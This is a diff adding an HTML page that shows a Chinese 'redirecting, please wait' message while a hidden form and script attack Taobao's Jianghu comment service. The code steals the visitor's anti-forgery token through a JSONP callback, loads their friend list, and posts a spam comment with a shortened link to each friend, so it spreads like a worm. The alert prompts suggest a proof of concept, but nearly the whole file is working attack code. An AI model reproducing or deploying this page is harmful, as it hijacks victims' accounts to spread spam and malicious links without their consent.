@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=gbk" />
+    </head>
+    <body>
+        <p>请稍等，系统正在跳转中...</p>
+        <form style="visibility:hidden;"
+            action="http://comment.jianghu.taobao.com/json/insert_comment.htm?&action=comment%2FCommentAction&event_submit_do_insert_comment=true&callback=CommentBox.onPostNew" 
+            method="post" target="iframe" id="postForm">
+            <textarea name="content">哈哈，我在淘农场偷了你个萝卜 http://bit.ly/21XMNl</textarea> <br />
+            <input type="hidden" value="0" name="isWhisper">
+            <input type="hidden" value="1" name="typeId">
+            <input type="hidden" value="" name="targetKey" id="targetKey">
+            <input type="hidden" value="" name="targetUrl">
+            <input type="hidden" value="" name="targetTitle">
+            <input type="hidden" value="" name="recUserId" id="recUserId">
+            <input type="hidden" value="" name="proUserId">
+            <input type="hidden" value="" name="recCommentId">
+            <input type="hidden" value="" name="replyToUserId">
+            <input type="hidden" value="" name="commenttbtoken" id="token">
+            <input type="submit" />
+        </form>
+        <iframe src="about:blank" name="iframe" style="visibility:hidden;"></iframe>
+        <script type="text/javascript" src="http://assets.taobaocdn.com/tbra/1.0/tbra-widgets.js"></script>
+        <script type="text/javascript">
+            var Y = YAHOO.util, Dom = Y.Dom, Event = Y.Event;
+            var getToken = function(a, b, c, d) {
+                Dom.get('token').value = d.match('commenttbtoken=(.+)')[1];
+            };
+            ~function() {
+                Y.Get.script('http://comment.jianghu.taobao.com/json/comment_list.htm?callback=getToken', {
+                    onSuccess: function() {
+                        Y.Get.script('http://jianghu.taobao.com/admin/json/spell_search_json.htm?nick=', {
+                            onSuccess: function() {
+                                if (_friendJson) {
+                                    for (var i = 0, len = _friendJson.friendList.length; i < len; i++) {
+                                        var friend = _friendJson.friendList[i];
+                                        Dom.get('targetKey').value = friend.friendId;
+                                        Dom.get('recUserId').value = friend.friendId;
+                                        alert('Send to: ' + friend.friendNick);
+                                        Dom.get('postForm').submit();
+                                        if (confirm('break?')) {
+                                            break;
+                                        }
+                                    }
+                                }
+                            }, charset: 'gbk'});
+                    }, charset: 'gbk'
+                });
+            }();
+        </script>
+    </body>
+</html>
